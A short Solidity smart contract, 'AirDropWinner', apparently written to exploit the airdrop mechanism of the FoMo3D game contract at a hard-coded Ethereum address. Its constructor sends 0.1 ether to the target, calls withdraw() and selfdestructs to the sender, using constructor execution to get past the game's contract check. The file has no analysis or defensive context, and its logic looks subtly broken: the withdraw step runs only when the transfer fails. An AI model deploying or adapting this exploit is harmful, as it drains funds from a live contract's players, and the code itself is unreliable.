pragma solidity ^0.4.24;

interface FoMo3DlongInterface {
    function airDropTracker_() external returns (uint256);
    function airDropPot_() external returns (uint256);
    function withdraw() external;
}






contract AirDropWinner {
    
    FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    





    constructor() public {
        if(!address(fomo3d).call.value(0.1 ether)()) {
           fomo3d.withdraw();
           selfdestruct(msg.sender);
        }

    }
}
